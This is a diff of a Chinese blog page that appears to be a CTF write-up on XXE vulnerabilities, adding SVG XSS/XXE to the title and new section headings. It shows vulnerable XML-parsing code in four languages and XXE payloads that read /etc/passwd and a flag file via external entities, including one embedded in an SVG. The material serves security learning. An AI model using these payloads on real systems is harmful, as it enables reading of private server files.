@@ -21,14 +21,14 @@
   
     <meta name="description" content="XXE前置知识(部分资料借鉴于XXE漏洞学习 - Suzen)​	XXE 是一种 XML 外部实体注入漏洞。当应用程序解析用户提交的 XML 时，如果启用了外部实体解析，并且没有正确过滤或限制，攻击者可以通过定义外部实体来读取服务器本地文件发起 SSRF 等。 1.基础的xxe利用方式基础文件读取（有回显） 原理：通过定义外部实体引用本地文件（如 &#x2F;etc&#x2F;passwd），当">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记录一次有关XXE漏洞的学习">
+<meta property="og:title" content="记录一次有关XXE漏洞的学习及有关svg的xss和xxe漏洞">
 <meta property="og:url" content="https://azumisaki.github.io/2026/04/07/xxe/index.html">
 <meta property="og:site_name" content="Sakiの博客">
 <meta property="og:description" content="XXE前置知识(部分资料借鉴于XXE漏洞学习 - Suzen)​	XXE 是一种 XML 外部实体注入漏洞。当应用程序解析用户提交的 XML 时，如果启用了外部实体解析，并且没有正确过滤或限制，攻击者可以通过定义外部实体来读取服务器本地文件发起 SSRF 等。 1.基础的xxe利用方式基础文件读取（有回显） 原理：通过定义外部实体引用本地文件（如 &#x2F;etc&#x2F;passwd），当">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://azumisaki.github.io/img/7.jpeg">
 <meta property="article:published_time" content="2026-04-07T10:30:22.000Z">
-<meta property="article:modified_time" content="2026-05-07T11:59:34.772Z">
+<meta property="article:modified_time" content="2026-05-07T13:03:15.675Z">
 <meta property="article:author" content="AzumiSaki">
 <meta property="article:tag" content="XEE漏洞">
 <meta name="twitter:card" content="summary_large_image">
@@ -36,7 +36,7 @@
   
   
   
-  <title>记录一次有关XXE漏洞的学习 - Sakiの博客</title>
+  <title>记录一次有关XXE漏洞的学习及有关svg的xss和xxe漏洞 - Sakiの博客</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -217,7 +217,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="记录一次有关XXE漏洞的学习"></span>
+            <span id="subtitle" data-typed-text="记录一次有关XXE漏洞的学习及有关svg的xss和xxe漏洞"></span>
           
         </div>
 
@@ -251,7 +251,7 @@
         
         
         
-          14 分钟
+          15 分钟
         
       </span>
     
@@ -292,7 +292,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">记录一次有关XXE漏洞的学习</h1>
+            <h1 id="seo-header">记录一次有关XXE漏洞的学习及有关svg的xss和xxe漏洞</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
@@ -362,21 +362,22 @@
 
 <h2 id="常见的漏洞代码形式"><a href="#常见的漏洞代码形式" class="headerlink" title="常见的漏洞代码形式"></a>常见的漏洞代码形式</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml">// Java中的XXE漏洞模式<br>DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();<br>DocumentBuilder builder = factory.newDocumentBuilder();<br>Document document = builder.parse(new InputSource(new StringReader(xmlInput)));<br><br>// Python中的XXE漏洞模式<br>import xml.etree.ElementTree as ET<br>tree = ET.parse(xml_input)<br>root = tree.getroot() <br><br>// PHP中的XXE漏洞模式<br>$dom = new DOMDocument();<br>$dom-&gt;loadXML($xml_input);<br><br>// Node.js中的XXE漏洞模式<br>const libxmljs = require(&quot;libxmljs&quot;);<br>const xmlDoc = libxmljs.parseXml(xml_input);<br></code></pre></td></tr></table></figure>
 
-<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="新手：0xgame-2025留言板（粉）"><a href="#新手：0xgame-2025留言板（粉）" class="headerlink" title="新手：0xgame 2025留言板（粉）"></a>新手：0xgame 2025留言板（粉）</h3><p>开题</p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="新手：0xGame-2025留言板（粉）"><a href="#新手：0xGame-2025留言板（粉）" class="headerlink" title="新手：0xGame 2025留言板（粉）"></a>新手：0xGame 2025留言板（粉）</h3><p>开题</p>
 <p>弱密码(admin&#x2F;admin123)爆破后进入题目：</p>
-<p><img src="/img/0xgame2025/6.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/0xGame2025/6.png" srcset="/img/loading.gif" lazyload></p>
 <p>十分简洁，就是直接输入插入代码</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/0xgame2025/7.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/0xGame2025/7.png" srcset="/img/loading.gif" lazyload></p>
 <p>发现回显成功，修改文件路径拿到flag</p>
-<p><img src="/img/0xgame2025/8.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/0xGame2025/8.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="中等难度：极客大挑战2025——Image-Viewer"><a href="#中等难度：极客大挑战2025——Image-Viewer" class="headerlink" title="中等难度：极客大挑战2025——Image Viewer"></a>中等难度：极客大挑战2025——Image Viewer</h3><p>开题发现是一个在线浏览图片的网址，故可以联想到svg+xxe漏洞的这样一个形式</p>
 <p>尝试简单的payload</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/0xgame2025/9.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/0xGame2025/9.png" srcset="/img/loading.gif" lazyload></p>
 <p>拿到flag</p>
+<h2 id="有关SVG文件的上传漏洞"><a href="#有关SVG文件的上传漏洞" class="headerlink" title="有关SVG文件的上传漏洞"></a>有关SVG文件的上传漏洞</h2><h3 id="1-svg造成的xss漏洞"><a href="#1-svg造成的xss漏洞" class="headerlink" title="1.svg造成的xss漏洞"></a>1.svg造成的xss漏洞</h3><p>首先svg的payload构建方式跟xxe是差不多的</p>
 
                 
               </div>
@@ -422,7 +423,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>记录一次有关XXE漏洞的学习</div>
+      <div>记录一次有关XXE漏洞的学习及有关svg的xss和xxe漏洞</div>
       <div>https://azumisaki.github.io/2026/04/07/xxe/</div>
     </div>
     <div class="license-meta">
